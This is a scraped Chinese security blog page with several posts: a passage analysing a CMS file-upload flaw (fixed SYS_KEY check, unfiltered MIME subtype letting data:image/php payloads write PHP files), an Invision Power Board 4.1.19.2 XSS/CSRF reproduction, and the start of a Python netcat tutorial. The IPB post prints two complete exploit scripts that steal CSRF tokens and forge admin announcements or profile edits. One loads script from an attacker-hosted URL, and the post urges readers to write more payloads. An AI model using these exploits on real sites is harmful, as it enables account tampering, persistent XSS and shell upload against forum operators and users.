<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$params = <span class="keyword">array</span>();</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">B</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'1'</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'2'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$test = <span class="keyword">new</span> A();</div><div class="line"></div><div class="line">call_user_func_array(<span class="keyword">array</span>(&amp;$test,<span class="string">'B'</span>),$params);</div></pre></td></tr></table></figure>
<p>然后我们跟进api中的data2方法中。</p>
<p><img src="http://i4.piimg.com/599904/fd267cb77702d4dd.png" alt=""></p>
<p>auth的值会跟md5(SYS_KEY)进行比对，只有相同才能进行下一步。然后我们搜索SYS_KEY。</p>
<p><img src="http://i4.piimg.com/599904/28760bff04353a9c.png" alt=""><br>SYS_KEY是定义在<code>/config/system.php</code>中的常量，换言之，对应的auth也是固定的。那压根就没有什么验证可言。这一步绕过了，然后往下看。</p>
<p><img src="http://i4.piimg.com/599904/e70f53b8912b9f13.png" alt=""><br>首先从REQUEST获取file参数。然后将空格转换为+号。判断文件夹是否存在，不存在则创建。然后重点来了，用正则提取file参数,(\w+)提取了MIME中的subtype。然而这里对subtype却没有进行任何过滤，所以当我们构造data:image/php;base64,xxxxx这样的参数时，会直接生成一个<code>0x0.php</code>出来。最后，对后面的base64进行解码，写入这个生成的<code>0x0.php</code>当中。这是将一句话或者马进行base64编码即可直接上传。</p>
<p>我们按照作者的payload测试一下，成功执行后访问对应的文件名。</p>
<p><img src="http://i4.piimg.com/599904/cf3c29a2a03591a7.png" alt=""><br>成功显示phpinfo。<br>显然，开发者对file_put_contents过滤有问题。按照这个思路，大家可以搜索这个cms当中的file_put_contents函数，然后逆向跟踪。</p>
<p>另外一个思路，就是这里的SYS_KEY使用常量太蠢了，验证形同虚设，大家也可以根据这个去挖掘漏洞。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/08/08/IPS-4-1-19-2-XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/08/IPS-4-1-19-2-XSS/" itemprop="url">IPS_4.1.19.2_XSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-08T11:28:24+08:00">
                2017-08-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php/" itemprop="url" rel="index">
                    <span itemprop="name">php</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Invision-Power-Board-4-1-19-2-XSS-CSRF-File-Upload-Information-Disclosure"><a href="#Invision-Power-Board-4-1-19-2-XSS-CSRF-File-Upload-Information-Disclosure" class="headerlink" title="Invision Power Board 4.1.19.2 XSS / CSRF / File Upload / Information Disclosure"></a>Invision Power Board 4.1.19.2 XSS / CSRF / File Upload / Information Disclosure</h3><p>IPB是一个集论坛展示与CMS的PHP平台。这套系统本身是不开源的，但是我为了复现该漏洞，从网上下载了该平台的一个盗版。该文件我已经作为附件上传到小密圈中了，有兴趣的圈友可以看看。</p>
<p>首先，根据原文，漏洞的触发点在<br><code>http://&lt;target&gt;/admin/convertutf8/index.php?controller=</code></p>
<p>作者说controller参数并没有很好的过滤，那么我们打开phpstrom的debug功能，对参数进行跟踪。</p>
<p><img src="http://i4.piimg.com/1949/23a9817e9037a221.png" alt=""></p>
<p>调用了run函数。</p>
<p><img src="http://i4.piimg.com/599904/4cb388f495634350.png" alt=""></p>
<p>拼接路径+controller参数+php后缀得到文件路径，判断该文件路径是否存在，不存在则跳入error。显然，我们输入的payload不可能真实存在对应的文件名，因此，进入error函数。</p>
<p><img src="http://i1.buimg.com/599904/79a6d2e31518bdf3.png" alt=""></p>
<p>error直接sendout一个error message给template，看起来好像没有问题，controller参数似乎并没有产生影响。我们接着跟进template。</p>
<p><img src="http://i1.buimg.com/599904/33228f807d1e4ffa.png" alt=""></p>
<p>我们可以看到,controller没经任何过滤机会直接赋给了template中的<code>$controller</code>变量。</p>
<p><img src="http://i1.buimg.com/599904/dc35a20e29e748fe.png" alt=""></p>
<p>确实，template中没有经过任何过滤就获取了controller参数，将其放入模板变量中替代。我们构造一下payload</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?controller=<span class="string">'&#125;;alert(1);&#123;'</span></div></pre></td></tr></table></figure>
<p><img src="http://i4.piimg.com/599904/ee5346621255a24a.png" alt=""></p>
<p>成功弹框。根据这个XSS，可以构造出相应的针对管理员权限账号的CSRF。作者给出对应的EXP如下。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">http://www.sxcurity.pro/pocs/xss.js</div><div class="line"> _</div><div class="line">(_)_ ____      ___ __</div><div class="line">| | '_ \ \ /\ / / '_ \</div><div class="line">| | |_) \ V  V /| | | |</div><div class="line">|_| .__/ \_/\_/ |_| |_|</div><div class="line"> |_|  IPB Exploit</div><div class="line">      by @sxcurity</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="comment">// specifies the target, the title of the announcement, and the xss payload!</span></div><div class="line"><span class="keyword">var</span> target = 'http:<span class="comment">//&lt;target&gt;/index.php?/modcp/announcements/&amp;action=create';</span></div><div class="line"><span class="keyword">var</span> title = 'URGENT';</div><div class="line"></div><div class="line"><span class="comment">// Don't use quotes! It'll break our form down below!</span></div><div class="line"><span class="keyword">var</span> payload = '&lt;script src=<span class="comment">//&lt;ATTACKER&gt;/lol.js&gt;&lt;/script&gt;';</span></div><div class="line"></div><div class="line"><span class="comment">// steals the csrf token ;)</span></div><div class="line"><span class="keyword">var</span> cdl = <span class="built_in">get</span>(target);</div><div class="line">document.body.innerHTML = cdl;</div><div class="line"><span class="keyword">var</span> <span class="keyword">form</span> = document.getElementsByTagName('<span class="keyword">input</span>')[3];</div><div class="line"><span class="keyword">var</span> <span class="keyword">token</span> = <span class="keyword">form</span>.value;</div><div class="line"></div><div class="line"><span class="comment">// DON'T EDIT!!</span></div><div class="line"><span class="comment">// Gets the current date! Thanks stackoverflow</span></div><div class="line"><span class="keyword">var</span> today = new <span class="built_in">Date</span>();</div><div class="line"><span class="keyword">var</span> dd = today.getDate();</div><div class="line"><span class="keyword">var</span> mm = today.getMonth()+1; <span class="comment">//January is 0!</span></div><div class="line"><span class="keyword">var</span> yyyy = today.getFullYear();</div><div class="line"><span class="keyword">if</span>(dd&lt;10)&#123;</div><div class="line">    dd='0'+dd;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(mm&lt;10)&#123;</div><div class="line">    mm='0'+mm;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> today = mm+'/'+dd+'/'+yyyy;</div><div class="line"></div><div class="line"><span class="comment">// build form with valid token and evil credentials</span></div><div class="line">document.body.innerHTML</div><div class="line">  += '&lt;<span class="keyword">form</span> id=<span class="string">"sxcurity"</span> action=<span class="string">"' + target + '"</span> method=<span class="string">"POST"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"_submitted"</span> value=<span class="string">"1"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"csrfKey"</span> value=<span class="string">"' + token + '"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"2097152"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"plupload"</span> value=<span class="string">"sxcurity"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_title"</span> value=<span class="string">"' + title + '"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_start"</span> value=<span class="string">"' + today +'"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_end_unlimited"</span> value=<span class="string">"0"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_content"</span> value=<span class="string">"'+ payload +'"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_content_upload"</span> value=<span class="string">"sxcurity"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_app_unlimited"</span> value=<span class="string">"*"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_calendars"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_calendars-zeroVal"</span> value=<span class="string">"on"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_download_categories"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_download_categories-zeroVal"</span> value=<span class="string">"on"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_forums"</span>&gt;'</div><div class="line">  + '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"announce_forums-zeroVal"</span> value=<span class="string">"on"</span>&gt;'</div><div class="line">  + '&lt;/<span class="keyword">form</span>&gt;';</div><div class="line"></div><div class="line"><span class="comment">// submits our csrf form!</span></div><div class="line">document.forms[<span class="string">"sxcurity"</span>].submit();</div><div class="line"></div><div class="line">function <span class="built_in">get</span>(url) &#123;</div><div class="line">    <span class="keyword">var</span> xmlHttp = new XMLHttpRequest();</div><div class="line">    xmlHttp.<span class="keyword">open</span>(<span class="string">"GET"</span>, url, false);</div><div class="line">    xmlHttp.send(null);</div><div class="line">    <span class="keyword">return</span> xmlHttp.responseText;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">www.sxcurity.pro/pocs/lol.js</div><div class="line"> _</div><div class="line">(_)_ ____      ___ __</div><div class="line">| | '_ \ \ /\ / / '_ \</div><div class="line">| | |_) \ V  V /| | | |</div><div class="line">|_| .__/ \_/\_/ |_| |_|</div><div class="line"> |_|  IPB Exploit</div><div class="line">      by @sxcurity</div><div class="line"></div><div class="line">index.php?/profile/&lt;user&gt;/&amp;tab=field_core_pfield_1</div><div class="line">This will add "sxcurity is my hero" to the user's about me.</div><div class="line">*/</div><div class="line"><span class="keyword">var</span> target = 'http:<span class="comment">//localhost/ips_4141/index.php';</span></div><div class="line"><span class="keyword">var</span> payload = 'sxcurity is my hero';</div><div class="line"></div><div class="line"><span class="comment">// Gets the Profile URL of the victim.</span></div><div class="line"><span class="keyword">var</span> cdl = <span class="built_in">get</span>(target);</div><div class="line">document.body.innerHTML = cdl;</div><div class="line"><span class="keyword">var</span> user_url = document.getElementsByTagName('a')[13];</div><div class="line"><span class="keyword">var</span> user_url1 = document.getElementsByTagName('a')[14];</div><div class="line"><span class="keyword">var</span> user_url2 = document.getElementsByTagName('a')[15];</div><div class="line"><span class="keyword">var</span> user_url3 = document.getElementsByTagName('a')[16];</div><div class="line"><span class="keyword">var</span> user_url4 = document.getElementsByTagName('a')[17];</div><div class="line"><span class="keyword">var</span> user_url5 = document.getElementsByTagName('a')[18];</div><div class="line"><span class="keyword">var</span> user_url6 = document.getElementsByTagName('a')[19];</div><div class="line"><span class="keyword">var</span> user_url7 = document.getElementsByTagName('a')[20];</div><div class="line"><span class="keyword">var</span> yay = user_url.href;</div><div class="line"><span class="keyword">var</span> yay1 = user_url1.href;</div><div class="line"><span class="keyword">var</span> yay2 = user_url2.href;</div><div class="line"><span class="keyword">var</span> yay3 = user_url3.href;</div><div class="line"><span class="keyword">var</span> yay4 = user_url4.href;</div><div class="line"><span class="keyword">var</span> yay5 = user_url5.href;</div><div class="line"><span class="keyword">var</span> yay6 = user_url6.href;</div><div class="line"><span class="keyword">var</span> yay7 = user_url7.href;</div><div class="line"><span class="keyword">var</span> mod_check0 = document.getElementsByTagName('a')[22];</div><div class="line"><span class="keyword">var</span> mod_check1 = document.getElementsByTagName('a')[22];</div><div class="line"><span class="keyword">var</span> mod_check2 = document.getElementsByTagName('a')[23];</div><div class="line"><span class="keyword">var</span> mod_check3 = document.getElementsByTagName('a')[24];</div><div class="line"><span class="keyword">var</span> mod_check4 = document.getElementsByTagName('a')[25];</div><div class="line"><span class="keyword">var</span> mod_check5 = document.getElementsByTagName('a')[26];</div><div class="line"><span class="keyword">var</span> mod_check6 = document.getElementsByTagName('a')[27];</div><div class="line"><span class="keyword">var</span> check0 = mod_check1.href;</div><div class="line"><span class="keyword">var</span> check1 = mod_check1.href;</div><div class="line"><span class="keyword">var</span> check2 = mod_check2.href;</div><div class="line"><span class="keyword">var</span> check3 = mod_check3.href;</div><div class="line"><span class="keyword">var</span> check4 = mod_check4.href;</div><div class="line"><span class="keyword">var</span> check5 = mod_check5.href;</div><div class="line"><span class="keyword">var</span> check6 = mod_check5.href;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">Mods / admins have a different amount of links before their profile URL, so this makes sure</div><div class="line">we grab the right profile URL and not some random one!</div><div class="line">*/</div><div class="line"><span class="keyword">if</span> (yay.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (yay1.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay1;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (yay2.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay2;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (yay3.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay3;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (yay4.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay4;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (yay5.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay5;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (yay6.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay6;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (yay7.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = normal user acc.</span></div><div class="line">  <span class="keyword">var</span> profile = yay7;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check0.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = mod or admin</span></div><div class="line">  <span class="keyword">var</span> profile = check0;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check2.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = mod or admin</span></div><div class="line">  <span class="keyword">var</span> profile = check2;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check3.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = mod or admin</span></div><div class="line">  <span class="keyword">var</span> profile = check3;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check4.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = mod or admin</span></div><div class="line">  <span class="keyword">var</span> profile = check4;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check5.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = mod or admin</span></div><div class="line">  <span class="keyword">var</span> profile = check5;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check6.includes(<span class="string">"profile"</span>))&#123;</div><div class="line">  <span class="comment">//user = mod or admin</span></div><div class="line">  <span class="keyword">var</span> profile = check6;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> final = profile + '<span class="keyword">edit</span>/';</div><div class="line"></div><div class="line"><span class="comment">// steals the csrf token</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> csrf = <span class="built_in">get</span>(final);</div><div class="line">document.body.innerHTML = csrf;</div><div class="line"><span class="keyword">var</span> <span class="keyword">inp</span> = document.getElementsByTagName('<span class="keyword">input</span>')[3];</div><div class="line"><span class="keyword">var</span> <span class="keyword">token</span> = <span class="keyword">inp</span>.value;</div><div class="line"></div><div class="line"><span class="comment">// build form with valid token and evil credentials</span></div><div class="line">document.body.innerHTML</div><div class="line">+= '&lt;<span class="keyword">form</span> id=<span class="string">"woot"</span> action=' + final + ' method=<span class="string">"POST"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"form_submitted"</span> value=<span class="string">"1"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"csrfKey"</span> value=<span class="string">"' + token + '"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"2097152"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"plupload"</span> value=<span class="string">"sxcurity"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"bday[month]"</span> value=<span class="string">"0"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"bday[day]"</span> value=<span class="string">"0"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"bday[year]"</span> value=<span class="string">"0"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"enable_status_updates"</span> value=<span class="string">"0"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"enable_status_updates_checkbox"</span> value=<span class="string">"1"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"core_pfield_1"</span> value=<span class="string">"' + payload + '"</span>&gt;'</div><div class="line">+ '&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"core_pfield_1_upload"</span> value=<span class="string">"sxcurity"</span>&gt;'</div><div class="line">+ '&lt;/<span class="keyword">form</span>&gt;';</div><div class="line"></div><div class="line"><span class="comment">// submits our csrf form!</span></div><div class="line">document.forms[<span class="string">"woot"</span>].submit();</div><div class="line"></div><div class="line">function <span class="built_in">get</span>(url) &#123;</div><div class="line">    <span class="keyword">var</span> xmlHttp = new XMLHttpRequest();</div><div class="line">    xmlHttp.<span class="keyword">open</span>(<span class="string">"GET"</span>, url, false);</div><div class="line">    xmlHttp.send(null);</div><div class="line">    <span class="keyword">return</span> xmlHttp.responseText;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是两个不同的payload，具体做了什么就当是留给各位的一个小小的问题。并且各位可以发挥自己的想象力，我们还可以去实现怎样的攻击，写出更好玩的payload。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/07/03/python编写简单netcat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/03/python编写简单netcat/" itemprop="url">python编写简单netcat</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-03T16:59:02+08:00">
                2017-07-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>之前ke推送的netcat的用法相信大家已经熟悉了，今天我来分享一下如何使用python去编写一个简单的netcat。当然了，实际使用的话，因为要依赖python环境，所以不免有点鸡肋，因此这篇文章更侧重于分享简单的python安全工具的写法。</p>
<p>以下为要用到的python库。</p>
<ul>
<li>socket</li>
<li>subprocess</li>
<li><p>argparse</p>
<p>同样的，本篇文章不对这些库做过多介绍，有兴趣的自行阅读官方文档。</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> argparse</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> traceback</div><div class="line"></div><div class="line"></div><div class="line">class netcat:</div><div class="line">    def __init__(<span class="built_in">self</span>):</div><div class="line">        <span class="built_in">self</span>.parser = argparse.ArgumentParser()</div><div class="line">        <span class="built_in">self</span>._init_args_parser()</div><div class="line">        <span class="built_in">self</span>.args = <span class="built_in">self</span>.parser.parse_args()</div><div class="line">        <span class="built_in">self</span>.client_socket = <span class="literal">None</span></div><div class="line">        <span class="built_in">self</span>.server_socket = <span class="literal">None</span></div><div class="line">        <span class="keyword">if</span> <span class="built_in">self</span>.args.l:</div><div class="line">            <span class="built_in">self</span>.listen_mode()</div><div class="line">        elif <span class="built_in">self</span>.args.c:</div><div class="line">            <span class="built_in">self</span>.client_mode()</div></pre></td></tr></table></figure>
</li>
</ul>
<p>构造一个netcat类，一些常用变量直接设置为类变量方便访问。netcat的主程序即为<strong>init</strong>()，包括初始化以及后续执行阶段。<code>client_socket</code>为服务器被连接是的socket，<code>server_socket</code>则为客户端连接时获得的socket。<code>argparse.ArgumentParser()</code>返回一个操作命令行参数的对象，调用<code>parse_args()</code>获得参数。</p>
